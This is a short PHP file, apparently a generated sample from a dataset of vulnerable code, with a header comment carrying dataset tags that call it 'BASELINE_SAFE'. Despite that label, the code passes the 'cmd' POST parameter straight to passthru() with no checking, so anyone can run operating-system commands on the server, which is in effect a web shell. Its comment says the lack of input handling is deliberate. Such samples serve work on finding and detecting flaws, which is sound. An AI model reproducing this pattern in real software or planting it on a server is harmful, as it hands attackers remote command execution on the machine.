<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_LOCAL_COPY; SKELETON=S0; KEY=cmd; SINK=B4; VAR=v0128 */
function SINK_B4($command){
    passthru($command);
}
$p = $_POST;
$inp = (string)($p["cmd"] ?? "");
$inp = (string)$inp; // no value processing
$out = SINK_B4($inp);
echo (string)($out);
?>
